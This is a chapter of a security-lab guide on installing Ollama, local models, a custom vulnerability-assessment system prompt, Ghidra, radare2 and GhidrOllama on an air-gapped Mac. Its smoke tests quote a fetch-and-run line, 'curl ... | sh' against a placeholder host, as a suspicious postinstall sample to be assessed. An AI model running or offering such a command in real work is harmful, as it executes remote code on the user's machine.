# Chapter 3: Lab Setup

This chapter walks you through setting up every tool on your air-gapped MacBook Air M1 (8 GB). The pattern is always the same: download on a staging machine with internet, verify, transfer via USB, install offline.

## Overview

When you finish this chapter you will have:

| Tool | Purpose | Disk space |
|------|---------|------------|
| Ollama | Local LLM runtime with Metal acceleration | ~200 MB (binary) |
| `llama3.2:3b` | General reasoning, triage, remediation | ~2 GB |
| `phi3:mini` | Code and JavaScript analysis | ~2.3 GB |
| `gemma3:4b` | Fast pattern-matching triage | ~2.5 GB |
| `vuln-assessor` | Custom security-focused model (built on llama3.2:3b) | negligible (uses llama3.2:3b weights) |
| Ghidra | Binary reverse engineering (GUI) | ~700 MB + JDK ~300 MB |
| radare2 | Lightweight binary analysis (CLI) | ~50 MB |
| GhidrOllama | Ghidra-to-Ollama bridge script | ~50 KB |

**Total disk space needed**: approximately 8-9 GB. Ensure at least 20 GB free to leave room for analysis artifacts and swap.

## 3.1 Install Ollama

### On the staging machine (internet-connected)

Download the macOS installer for Apple Silicon:

```bash
# Download the official macOS app
curl -L -o Ollama-darwin.zip https://ollama.com/download/Ollama-darwin.zip

# Verify the download (check the SHA against ollama.com/download)
shasum -a 256 Ollama-darwin.zip
```

Alternatively, download the standalone CLI binary if you prefer not to use the app:

```bash
curl -L -o ollama https://ollama.com/download/ollama-darwin-arm64
chmod +x ollama
shasum -a 256 ollama
```

### Transfer to the air-gapped laptop

Copy `Ollama-darwin.zip` (or the standalone binary) to your USB drive. See Chapter 4 for USB hygiene procedures.

### Install on the air-gapped laptop

**App method** (recommended for first-time setup):

```bash
# Mount USB, copy zip to ~/Downloads
unzip ~/Downloads/Ollama-darwin.zip -d /Applications/
# Launch Ollama.app from Applications
# It will install the CLI tool and start the background service
```

**Standalone binary method**:

```bash
sudo cp /Volumes/USB/ollama /usr/local/bin/ollama
sudo chmod +x /usr/local/bin/ollama

# Start the service manually
ollama serve &
```

### Verify

```bash
ollama --version
# Should print the version number

curl http://localhost:11434/api/tags
# Should return JSON (empty model list if no models yet)
```

## 3.2 Install models

### On the staging machine

Pull all three models. This downloads several GB per model:

```bash
ollama pull llama3.2:3b
ollama pull phi3:mini
ollama pull gemma3:4b
```

Verify they work:

```bash
ollama run llama3.2:3b "Say hello in one sentence." --verbose
```

### Locate the model files

Ollama stores models in a content-addressable blob store:

```bash
# macOS default location
ls ~/.ollama/models/
# You should see: blobs/  manifests/
```

The entire `~/.ollama/models/` directory is what you need to transfer.

### Transfer to the air-gapped laptop

```bash
# On the staging machine, create a compressed archive
tar -czf ollama-models.tar.gz -C ~/.ollama models/

# Check the size (expect 6-8 GB)
ls -lh ollama-models.tar.gz
```

Copy `ollama-models.tar.gz` to your USB drive.

On the air-gapped laptop:

```bash
# Extract to Ollama's data directory
tar -xzf /Volumes/USB/ollama-models.tar.gz -C ~/.ollama/

# Verify models are visible
ollama list
```

Expected output:

```
NAME            ID              SIZE      MODIFIED
llama3.2:3b     a80c4f17acd5    2.0 GB    ...
phi3:mini       4f2222927938    2.3 GB    ...
gemma3:4b       7a2c21847d3c    2.5 GB    ...
```

### Smoke test each model

```bash
ollama run llama3.2:3b "What is a YARA rule? Answer in two sentences."
ollama run phi3:mini "Explain what eval() does in JavaScript. One paragraph."
ollama run gemma3:4b "Is this suspicious? A postinstall script that runs curl | bash."
```

If all three respond coherently, your model stack is ready.

## 3.3 Build the custom vuln-assessor model

The `vuln-assessor` model wraps `llama3.2:3b` with a security-focused system prompt. It does not download new weights; it reuses the existing model with custom behavior.

Copy the Modelfile from `docs/guide/templates/vuln-assessor.Modelfile` or create it:

```bash
cat > ~/vuln-assessor.Modelfile << 'MODELFILE'
FROM llama3.2:3b
SYSTEM """
You are a DevSecOps-focused Security Vulnerability Assessment assistant.
Your job is to help a DevOps engineer:
- Analyze dependencies (npm, pnpm, yarn, etc.).
- Review JavaScript payloads (e.g., Safari/JSC exploit chains).
- Reverse-engineer malware-like binaries.
- Propose concrete IoCs, detection rules (YARA, Sigma, log queries), and remediation steps.

Instructions:
- Answer concisely and clearly.
- If evidence is weak, say "UNCERTAIN" instead of guessing.
- Prefer bullet-style remediation steps and concrete code snippets.
- Never suggest exposing the air-gapped laptop to the internet.
- For JavaScript, highlight suspicious eval, atob, large hex arrays, or shellcode-like patterns.
- For binaries, identify likely C2 domains, IPs, or file-based persistence.
"""
MODELFILE
```

Build and test:

```bash
ollama create vuln-assessor:1.0 -f ~/vuln-assessor.Modelfile

# Verify it appears in the model list
ollama list | grep vuln-assessor

# Smoke test
ollama run vuln-assessor:1.0 "A postinstall script runs: curl -sL https://cdn.example.com/x | sh && rm -f /tmp/.x. Assess this."
```

The two additional custom models (`supplychain` and `ios-js-re`) are in `docs/guide/templates/`. Build them the same way when you reach Chapters 5 and 7.

## 3.4 Install Ghidra

Ghidra requires a Java Development Kit (JDK 17+).

### On the staging machine

```bash
# Download Ghidra (check https://ghidra-sre.org for latest version)
curl -L -o ghidra_11.3_PUBLIC.zip https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.3_build/ghidra_11.3_PUBLIC_20250219.zip

# Download JDK for macOS ARM64 (Eclipse Temurin recommended)
curl -L -o temurin-jdk-17.tar.gz https://api.adoptium.net/v3/binary/latest/17/ga/mac/aarch64/jdk/hotspot/normal/eclipse

# Verify checksums
shasum -a 256 ghidra_11.3_PUBLIC.zip
shasum -a 256 temurin-jdk-17.tar.gz
```

### Transfer and install on the air-gapped laptop

```bash
# Install JDK
sudo mkdir -p /Library/Java/JavaVirtualMachines
sudo tar -xzf /Volumes/USB/temurin-jdk-17.tar.gz -C /Library/Java/JavaVirtualMachines/

# Verify Java
java -version
# Should show: openjdk version "17.x.x"

# Install Ghidra
mkdir -p ~/Tools
unzip /Volumes/USB/ghidra_11.3_PUBLIC.zip -d ~/Tools/
```

### Memory tuning for 8 GB

Ghidra's default JVM heap is often 1-2 GB. On an 8 GB machine where you also need RAM for Ollama, tune it down:

Edit `~/Tools/ghidra_11.3_PUBLIC/support/launch.properties`:

```properties
# Reduce max heap to 1.5 GB (default is often higher)
MAXMEM=1536M
```

**Important**: Do not run Ghidra and Ollama simultaneously. The sequential workflow is:

1. Open Ghidra, load and analyze the binary
2. Export decompiled functions to text files (File > Export or via GhidrOllama)
3. Close Ghidra
4. Run Ollama against the exported text

### Verify

```bash
~/Tools/ghidra_11.3_PUBLIC/ghidraRun
# Ghidra should launch. Accept the license, create a test project, then close.
```

## 3.5 Install radare2 (lightweight alternative)

radare2 is a CLI-based RE framework. It uses a fraction of the memory Ghidra needs and can run alongside Ollama on 8 GB.

### On the staging machine

```bash
# Clone and build (or download a release tarball)
git clone https://github.com/radareorg/radare2.git
cd radare2
sys/install.sh

# Package for transfer
tar -czf radare2-install.tar.gz /usr/local/bin/r2 /usr/local/bin/rabin2 \
    /usr/local/bin/rahash2 /usr/local/lib/libr_* /usr/local/share/radare2/
```

Alternatively, if Homebrew is available on the staging machine:

```bash
brew install radare2
# Then locate and package the installed files
```

### Install on the air-gapped laptop

```bash
# Extract the pre-built binaries
sudo tar -xzf /Volumes/USB/radare2-install.tar.gz -C /
```

### Verify

```bash
r2 -v
# Should print the radare2 version

# Quick test: analyze a system binary
r2 -A /bin/ls -c "afl~main" -q
# Should list functions containing "main"
```

### When to use which

| Scenario | Use Ghidra | Use radare2 |
|----------|-----------|-------------|
| First time analyzing a binary, want visual overview | Yes | |
| Need to see control flow graphs | Yes | |
| Want to annotate and save analysis across sessions | Yes | |
| Memory is tight and Ollama needs to run | | Yes |
| Quick triage of strings, headers, imports | | Yes |
| Scripted/automated extraction of function info | | Yes |
| Analyzing a MikroTik firmware blob | Either works | |

## 3.6 Install GhidrOllama

GhidrOllama is a Python script that sends selected functions from Ghidra to Ollama for LLM-assisted annotation.

### On the staging machine

```bash
git clone https://github.com/lr-m/GhidrOllama.git
```

You need two things from this repo:
- `GhidrOllama.py` (the main script)
- `ghidrollama_utils/` (supporting module)

### Transfer and install on the air-gapped laptop

```bash
# Copy to Ghidra's script directory
mkdir -p ~/ghidra_scripts
cp /Volumes/USB/GhidrOllama/GhidrOllama.py ~/ghidra_scripts/
cp -r /Volumes/USB/GhidrOllama/ghidrollama_utils ~/ghidra_scripts/
```

### Configure in Ghidra

1. Launch Ghidra and open a project
2. Go to **Window > Script Manager**
3. Click the **Script Directories** icon (folder with green +)
4. Add `~/ghidra_scripts`
5. Find `GhidrOllama.py` in the script list
6. Run it once — it will prompt for the Ollama URL
7. Enter: `http://localhost:11434`
8. Select a model (e.g., `vuln-assessor:1.0`)

### Usage workflow (sequential, for 8 GB)

1. **With Ollama stopped**, launch Ghidra and load your binary
2. Let Ghidra's auto-analysis complete
3. Select a function in the decompiler view
4. Start Ollama in the background: open a terminal and run `ollama serve &`
5. Run GhidrOllama script on the selected function
6. Review the LLM's annotation
7. When done, stop Ollama (`pkill ollama`) before doing heavy Ghidra analysis on the next function

Alternatively, export all decompiled functions to a file and analyze them in batch with Ollama after closing Ghidra entirely.

## 3.7 Verification checklist

Run through this checklist to confirm everything is working:

```
[ ] Ollama responds to: curl http://localhost:11434/api/tags
[ ] ollama list shows: llama3.2:3b, phi3:mini, gemma3:4b
[ ] ollama run llama3.2:3b "test" produces a response
[ ] ollama run phi3:mini "test" produces a response
[ ] ollama run gemma3:4b "test" produces a response
[ ] vuln-assessor:1.0 is in ollama list
[ ] ollama run vuln-assessor:1.0 "test" produces a response
[ ] java -version shows JDK 17+
[ ] Ghidra launches and can create a project
[ ] Ghidra's MAXMEM is set to 1536M or less
[ ] r2 -v prints the radare2 version
[ ] GhidrOllama.py is in ~/ghidra_scripts/
[ ] GhidrOllama connects to Ollama when both are running
```

If any item fails, troubleshoot before proceeding to exercises.

## Next steps

- **Chapter 4**: Learn the air-gap operational discipline before you start transferring real artifacts.
- **Chapter 5**: Your first TADR exercise (npm supply chain attack).
